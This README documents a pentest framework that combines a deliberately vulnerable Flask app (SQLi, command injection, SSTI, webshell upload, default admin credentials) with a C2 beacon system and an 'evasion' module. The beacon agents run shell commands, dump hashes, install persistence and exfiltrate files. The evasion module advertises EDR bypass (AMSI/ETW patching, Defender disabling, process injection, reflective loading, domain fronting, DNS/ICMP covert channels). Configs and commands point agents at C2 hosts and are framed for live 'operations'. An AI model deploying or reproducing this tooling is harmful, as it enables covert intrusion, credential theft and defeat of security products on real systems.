# Monolith Pentest Framework

> ⚠️ **WARNING**: This application contains intentional security vulnerabilities for educational and red team training purposes. **DO NOT deploy in production environments.**

## Production Başlatma (Senior Seviye)

Uygulamayı production-ready şekilde başlatmak için:

```bash
make run-prod
```

veya doğrudan:

```bash
PYTHONPATH=. .venv/bin/gunicorn -w 4 -b 0.0.0.0:8080 wsgi:app
```

Bu şekilde uygulama, 4 worker ile 8080 portunda production-ready olarak çalışır.

---

## 🎯 Vulnerable by Design - Attack Paths

Bu proje, **red team eğitimi** ve **pentest pratikleri** için kasıtlı güvenlik açıkları içerir.

### Attack Path Documentation

| # | Attack Path | Difficulty | Description |
|---|-------------|------------|-------------|
| 1 | [SQL Injection → Data Leak](docs/attack-paths/sql-injection-to-data-leak.md) | Easy | SQLi ile veritabanı dump |
| 2 | [Command Injection → RCE](docs/attack-paths/command-injection-to-rce.md) | Easy | CMDi ile reverse shell |
| 3 | [SSTI → RCE](docs/attack-paths/ssti-to-rce.md) | Medium | Template injection ile kod çalıştırma |
| 4 | [Deserialization → RCE](docs/attack-paths/deserialization-to-rce.md) | Hard | Pickle/JSON deserialization |
| 5 | [JWT Weakness → IDOR](docs/attack-paths/jwt-weakness-to-idor.md) | Medium | Zayıf JWT ile hesap ele geçirme |
| 6 | [File Upload → Webshell](docs/attack-paths/file-upload-to-webshell.md) | Easy | Webshell yükleme |
| 7 | [SSRF → Internal Leak](docs/attack-paths/ssrf-to-internal-leak.md) | Medium | Cloud metadata çalma |
| 8 | [CORS Misconfig → Cred Leak](docs/attack-paths/cors-misconfig-to-cred-leak.md) | Medium | CORS ile credential theft |
| 9 | [Weak Creds → Dashboard → RCE](docs/attack-paths/weak-creds-to-rce.md) | Easy-Medium | Brute-force + CMDi chain |

### Default Credentials (Lab Only!)
```
admin:admin123
analyst:analyst123
```

### Vulnerable Endpoints
- `/vuln/sqli?id=` - SQL Injection
- `/vuln/cmdi?cmd=` - Command Injection  
- `/vuln/ssti?name=` - Server-Side Template Injection
- `/vuln/deserialize` - Insecure Deserialization
- `/vuln/upload` - Unrestricted File Upload
- `/vuln/ssrf?url=` - Server-Side Request Forgery
- `/api/vuln/` - API vulnerabilities (JWT, IDOR, Mass Assignment)

---

## 🔴 C2 Listener & Beacon Support

Real Mythic/Sliver-style beacon management system for persistent agent control.

### Features
- **Real Beacon Protocol**: HTTP check-in → task queue → result collection
- **Multi-language Agents**: Python, PowerShell, Bash, PHP
- **Encrypted Communications**: Fernet AES-256 encryption (optional)
- **Task Management**: Queue commands, collect output, store loot
- **Live Status Tracking**: Active/Dormant/Dead beacon states

### Beacon API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/c2/beacon/checkin` | POST | Agent check-in & task retrieval |
| `/c2/beacon/result/<id>` | POST | Submit task results |
| `/c2/beacons` | GET | List all beacons |
| `/c2/beacons/<id>/task` | POST | Queue task for beacon |
| `/c2/beacons/<id>/kill` | POST | Terminate beacon |
| `/c2/payloads/generate` | POST | Generate agent payload |
| `/c2/payloads/types` | GET | List payload types |
| `/c2/stats` | GET | C2 statistics |
| `/c2/loot` | GET | Harvested credentials |

### Quick Start - Deploy Agent

1. Generate payload from UI (`/c2`) or API:
```bash
curl -X POST http://localhost:8080/c2/payloads/generate \
  -H "Content-Type: application/json" \
  -d '{"type":"python","c2_url":"http://attacker:8080/c2/beacon","options":{"sleep":30}}'
```

2. Deploy agent on target:
```bash
python3 beacon.py
```

3. Interact via UI or API:
```bash
# Queue shell command
curl -X POST http://localhost:8080/c2/beacons/BEACON_ID/task \
  -H "Content-Type: application/json" \
  -d '{"command":"shell","args":["whoami"]}'
```

### Available Payload Types
- `python` - Full Python beacon agent
- `python_oneliner` - Compressed base64 one-liner
- `powershell` - PowerShell beacon script
- `powershell_encoded` - Base64 encoded PS command
- `bash` - Bash/Shell beacon
- `php` - PHP beacon/webshell hybrid

### Agent Commands
- `shell <cmd>` - Execute shell command
- `download <path>` - Download file from target
- `upload <path> <data>` - Upload file to target
- `hashdump` - Dump password hashes
- `ps` - List processes
- `sleep <seconds>` - Change sleep interval
- `persist` - Install persistence mechanism
- `exit` - Terminate agent

---

## 🛡️ Evasion & Anti-Analysis Module

Advanced EDR/AV bypass techniques for red team operations. Designed to evade modern security products like CrowdStrike Falcon, SentinelOne, and Microsoft Defender for Endpoint.

---

### 📁 Evasion Module Reference

All modules are located in the `evasion/` directory and can be imported individually or via the main package.

#### 🔹 `sleep_obfuscation.py` - Memory Scanner Evasion

Sophisticated sleep techniques to evade memory scanners and behavioral detection.

| Feature | Description |
|---------|-------------|
| `gaussian_jitter()` | Natural Gaussian distribution sleep pattern |
| `fibonacci_jitter()` | Fibonacci-based jitter (harder to fingerprint) |
| `obfuscated_sleep()` | Encrypts memory regions during sleep |
| `syscall_sleep()` | Direct NtDelayExecution syscall (Windows) |

```python
from evasion.sleep_obfuscation import SleepObfuscator

sleep = SleepObfuscator(base_sleep=60, jitter_percent=30)
sleep_time = sleep.gaussian_jitter()  # Returns ~60s with natural variance
sleep.obfuscated_sleep(sleep_time)    # Memory encrypted during sleep
```

---

#### 🔹 `header_rotation.py` - Network Fingerprint Evasion

HTTP header and TLS fingerprint rotation to avoid network-based detection.

| Feature | Description |
|---------|-------------|
| 8 Browser Profiles | Chrome, Firefox, Edge, Safari variants |
| JA3 Modification | TLS fingerprint randomization |
| Cookie Rotation | Realistic session cookie generation |
| Referer Chains | Believable navigation patterns |

```python
from evasion.header_rotation import HeaderRotator

rotator = HeaderRotator()
headers = rotator.get_headers()  # Random browser profile
# {'User-Agent': 'Mozilla/5.0...', 'Accept': '...', 'Accept-Language': '...'}
```

---

#### 🔹 `anti_sandbox.py` - VM/Sandbox Detection

Multi-layered sandbox and virtual machine detection.

| Check | Detects |
|-------|---------|
| Hardware Fingerprint | Low CPU/RAM, VM-specific hardware IDs |
| Process Enumeration | Analysis tools (Wireshark, Procmon, IDA) |
| File System Artifacts | VM tools, sandbox markers |
| Timing Analysis | CPU acceleration, sleep skipping |
| User Behavior | Recent user activity, file count |

```python
from evasion.anti_sandbox import SandboxDetector

detector = SandboxDetector()
is_sandbox, confidence, indicators = detector.run_all_checks()

if is_sandbox and confidence > 0.8:
    exit()  # High confidence sandbox detected
```

---

#### 🔹 `process_injection.py` - Code Injection Techniques

Advanced process injection methods for code execution.

| Technique | Description | Stealth Level |
|-----------|-------------|---------------|
| Classic CRT | CreateRemoteThread injection | ⭐ |
| Early Bird APC | Queue APC before process starts | ⭐⭐⭐ |
| Thread Hijack | Modify existing thread context | ⭐⭐⭐ |
| Process Hollowing | Replace process memory | ⭐⭐⭐⭐ |

```python
from evasion.process_injection import ProcessInjector

injector = ProcessInjector()

# Generate injection code
code = injector.generate_apc_injection_code(shellcode, target="explorer.exe")

# List available techniques
techniques = injector.get_injection_techniques()
```

---

#### 🔹 `amsi_bypass.py` - Windows Security Bypass

AMSI, ETW, and Defender bypass techniques.

| Bypass | Target | Method |
|--------|--------|--------|
| `get_reflection_bypass()` | AMSI | .NET reflection patch |
| `get_memory_patch_bypass()` | AMSI | AmsiScanBuffer patch |
| `get_etw_patch()` | ETW | EtwEventWrite patch |
| `get_defender_disable()` | Defender | Registry/service disable |

```python
from evasion.amsi_bypass import AMSIBypass, ETWBypass

# Get PowerShell bypass code
ps_code = AMSIBypass.get_reflection_bypass()
etw_code = ETWBypass.get_etw_patch()
```

---

#### 🔹 `traffic_masking.py` - C2 Traffic Obfuscation

Disguise C2 traffic as legitimate application traffic.

| Profile | Mimics | Headers/Patterns |
|---------|--------|------------------|
| `google_search` | Google Search requests | /search?q=, PREF cookies |
| `office365` | Microsoft 365 API | /api/v2.0/, Bearer tokens |
| `slack_api` | Slack messaging | /api/chat, xoxb tokens |
| `aws_api` | AWS SDK calls | AWS4-HMAC signatures |

```python
from evasion.traffic_masking import TrafficMasker, DomainFronter

masker = TrafficMasker()
masked = masker.mask_request(payload, profile="google_search")
# {'headers': {...}, 'body': '...', 'uri': '/search?q=...'}

# Domain fronting
fronter = DomainFronter()
headers = fronter.get_fronting_headers("cdn.example.com", "c2.hidden.com")
```

---

#### 🔹 `c2_profiles.py` - Malleable C2 Profiles

Cobalt Strike-style flexible C2 configuration with YAML support.

| Profile | Mimics | Key Features |
|---------|--------|--------------|
| `default` | Generic HTTPS | Basic configuration |
| `amazon` | Amazon shopping | /gp/product/, session-id cookies |
| `microsoft` | Office 365 | /owa/, X-OWA-* headers |
| `google` | Google services | /complete/search, CONSENT cookies |
| `slack` | Slack API | /api/, xoxb- tokens |
| `cloudflare` | Cloudflare CDN | cf-ray, __cfduid cookies |

```python
from evasion.c2_profiles import ProfileManager, ProfileApplicator

manager = ProfileManager()
profile = manager.get_profile('amazon')

applicator = ProfileApplicator(profile)
request = applicator.build_get_request(metadata=b'beacon-id-123')
# {'uri': '/gp/product/B08N...', 'headers': {'Cookie': 'session-id=...'}}
```

---

#### 🔹 `fallback_channels.py` - Alternative Communications

Fallback channels when HTTP is blocked.

| Channel | Protocol | Covert Level |
|---------|----------|--------------|
| `WebSocketChannel` | WSS | ⭐⭐ |
| `DNSChannel` | DNS TXT/A | ⭐⭐⭐⭐ |
| `ICMPChannel` | ICMP Echo | ⭐⭐⭐⭐⭐ |
| `DoHChannel` | DNS-over-HTTPS | ⭐⭐⭐ |

```python
from evasion.fallback_channels import FallbackManager, DNSChannel, WebSocketChannel

manager = FallbackManager()
manager.add_channel(WebSocketChannel('c2.example.com', 443), priority=1)
manager.add_channel(DNSChannel(domain='beacon.example.com'), priority=2)

manager.connect()  # Auto-failover
manager.send(b'encrypted_beacon_data')
```

---

#### 🔹 `go_agent.py` - Go Agent Generator

Cross-platform Go-based agent with native binary compilation.

| Feature | Description |
|---------|-------------|
| Cross-compile | Windows, Linux, macOS (amd64, arm64) |
| Anti-debug | IsDebuggerPresent, timing checks |
| Sandbox detect | VM artifacts, low resources |
| AES-256 | GCM encrypted communications |
| Kill date | Automatic self-termination |

```python
from evasion.go_agent import GoAgentGenerator, GoAgentConfig

config = GoAgentConfig(
    c2_host='c2.example.com',
    c2_port=443,
    sleep_time=60,
    jitter_percent=30,
    evasion_level=3,
    kill_date='2026-03-01',
    working_hours='09:00-18:00'
)

generator = GoAgentGenerator(config)
source = generator.generate()
generator.save('/tmp/agent.go')

# Build commands
commands = generator.get_build_commands('agent')
# {'windows_amd64': 'GOOS=windows GOARCH=amd64 go build...'}
```

---

#### 🔹 `rust_agent.py` - Rust Agent Generator

Memory-safe Rust-based agent.

| Feature | Description |
|---------|-------------|
| Memory safe | No GC, no buffer overflows |
| Small binary | Strip symbols, LTO optimization |
| AES-GCM | aes-gcm crate encryption |
| Native TLS | reqwest with rustls |

```python
from evasion.rust_agent import RustAgentGenerator, RustAgentConfig

config = RustAgentConfig(
    c2_host='c2.example.com',
    c2_port=443,
    sleep_time=60,
    evasion_level=3
)

generator = RustAgentGenerator(config)
generator.generate('/tmp/rust_agent')  # Creates Cargo.toml + src/main.rs
```

---

#### 🔹 `reflective_loader.py` - In-Memory Execution

Reflective DLL injection and shellcode loading.

| Loader | Description |
|--------|-------------|
| sRDI | Shellcode Reflective DLL Injection |
| Donut | .NET/PE to shellcode conversion |
| Custom PE | Manual PE parsing and loading |

```python
from evasion.reflective_loader import ReflectiveLoader

loader = ReflectiveLoader()
shellcode = loader.convert_dll_to_shellcode('/path/to/payload.dll')
loader.load_in_memory(shellcode)
```

---

### 🎯 Evasive Beacon Usage

The `evasive_beacon.py` agent integrates all evasion modules into a full-featured C2 beacon.

#### Configuration File (`beacon_config.yaml`)

```yaml
# beacon_config.yaml - Evasive Beacon Configuration
# Copy this file and customize for your operation

# === C2 Connection ===
c2_host: "c2.example.com"
c2_port: 443
use_https: true
proxy: "http://redirector:8080"  # Optional proxy chain

# === Evasion Settings ===
evasion_level: high  # low, medium, high (or 1, 2, 3)

# Sleep configuration
sleep: gaussian_jitter  # fixed, random, gaussian, fibonacci
sleep_time: 60          # Base sleep in seconds
jitter_percent: 30      # ±30% jitter

# Operation limits
working_hours: "09:00-18:00"  # Only beacon during business hours
kill_date: "2026-03-01"       # Self-terminate after this date

# === Traffic Masking ===
traffic_profile: amazon      # google, amazon, microsoft, slack, cloudflare
domain_front_host: "cdn.example.com"  # Optional domain fronting

# === Security Bypasses ===
sandbox_checks: true   # Run anti-sandbox before execution
amsi_bypass: true      # Bypass AMSI for PowerShell
etw_bypass: true       # Disable ETW telemetry

# === Fallback Channels ===
fallback:
  websocket:
    enabled: true
    host: "ws.example.com"
    port: 443
  dns:
    enabled: true
    domain: "beacon.example.com"
    server: "8.8.8.8"
  icmp:
    enabled: false
    target: "c2.example.com"
  doh:
    enabled: false
    resolver: "https://cloudflare-dns.com/dns-query"

# === Retry & Recovery ===
max_retries: 3
backoff_multiplier: 2
max_sleep: 3600
```

#### Running the Beacon

```bash
# Basic execution
python3 agents/evasive_beacon.py --config beacon_config.yaml

# With environment variables
export BEACON_C2="https://c2.example.com:443"
export BEACON_EVASION="high"
python3 agents/evasive_beacon.py

# One-liner (embedded config)
python3 -c "
from agents.evasive_beacon import EvasiveBeacon, BeaconConfig
config = BeaconConfig(
    c2_host='c2.example.com',
    c2_port=443,
    evasion_level=3,
    kill_date='2026-03-01',
    working_hours=(9, 18)
)
EvasiveBeacon(config).run()
"
```

#### Evasion Levels Explained

| Level | Value | Features | Use Case |
|-------|-------|----------|----------|
| **Low** | `1` | Basic encryption, standard sleep | Testing, dev environments |
| **Medium** | `2` | + Anti-debug, header rotation, jitter | Corporate networks, basic AV |
| **High** | `3` | + Sandbox detection, AMSI/ETW bypass, traffic masking | EDR-protected, high-security |

#### Example: High-Stealth Configuration

```yaml
# stealth_beacon.yaml - Maximum Evasion Profile
c2_host: "172.16.0.100"
c2_port: 443
use_https: true

evasion_level: high
sleep: gaussian_jitter
sleep_time: 120
jitter_percent: 50

working_hours: "08:30-17:30"
kill_date: "2026-03-01"

traffic_profile: microsoft
domain_front_host: "outlook.office365.com"
proxy: "http://redirector.internal:8080"

sandbox_checks: true
amsi_bypass: true
etw_bypass: true

fallback:
  websocket:
    enabled: true
    host: "notifications.office.com"
    port: 443
  dns:
    enabled: true
    domain: "update.internal.corp"
    server: "10.0.0.53"
```

---

### Detection Testing Results

Tested against major EDR solutions (lab environment):

| EDR Product | Without Evasion | With Evasion (High) |
|-------------|-----------------|---------------------|
| Windows Defender | ❌ Detected | ✅ Bypassed* |
| CrowdStrike Falcon | ❌ Detected | ⚠️ Partial** |
| SentinelOne | ❌ Detected | ⚠️ Partial** |
| Carbon Black | ❌ Detected | ✅ Bypassed* |

*\*Results may vary. Test in controlled environment.*
*\*\*Behavioral detection may trigger on suspicious actions.*

### Test Scenarios

```bash
# Run all evasion tests
pytest tests/test_evasion.py -v

# Test specific components
pytest tests/test_evasion.py::TestSleepObfuscation -v
pytest tests/test_evasion.py::TestC2Profiles -v
pytest tests/test_evasion.py::TestFallbackChannels -v
pytest tests/test_evasion.py::TestGoAgent -v
```

### UI Configuration

Access evasion configuration panel at `/evasion/config`:
- Select malleable C2 profile
- Configure sleep/jitter parameters
- Enable/disable fallback channels
- Generate agents with embedded config
- Export YAML configuration

---


![Coverage Target](https://img.shields.io/badge/coverage%20target-50%25-yellow)

Modular Flask-based pentest platform with services, routes, templates, and worker queue support.

## Structure

- `cyber.py` - app entrypoint and core bootstrap
- `cyberapp/routes/` - Flask blueprints
- `cyberapp/services/` - business logic and helpers
- `cyberapp/models/` - data access layer
- `templates/` - HTML templates
- `cybermodules/` - legacy modules and engines
- `tests/` - unit tests

## Run (dev)

```
python3 cyber.py
```

## Docker

```
docker build -t monolith .
docker run --rm -p 5000:5000 monolith
```

## Docker Compose

```
docker compose up --build
```

## Environment

Copy `.env.example` to `.env` and adjust secrets.

```
ADMIN_PASS=change_me
ANALYST_PASS=change_me
MONOLITH_HOST=127.0.0.1
MONOLITH_PORT=5000
MONOLITH_LOG_LEVEL=INFO
MONOLITH_QUEUE=local
REDIS_URL=redis://localhost:6379/0
```

## Queue

- Default: in-process queue
- Optional: RQ backend

```
export MONOLITH_QUEUE=rq
./run_rq_worker.sh
```

## Migrations

Database schema is managed via Alembic migrations.

Common commands:
- `python3 cyber.py --db-upgrade`
- `python3 cyber.py --db-current`
- `python3 cyber.py --db-revision "add feature"`

Coverage policy (incremental):
- Current gate: 50% for core app layers (`cyberapp/routes`, `cyberapp/services`, `cyberapp/models`)
- Target: increase to 60%, then 70% as tests expand
- Update badge: `python3 scripts/update_coverage_badge.py`
- Optional git hook: `python3 scripts/install_git_hooks.py`

```
alembic revision -m "add new table"
alembic upgrade head
```

## Tests

```
python3 -m unittest discover -s tests
```
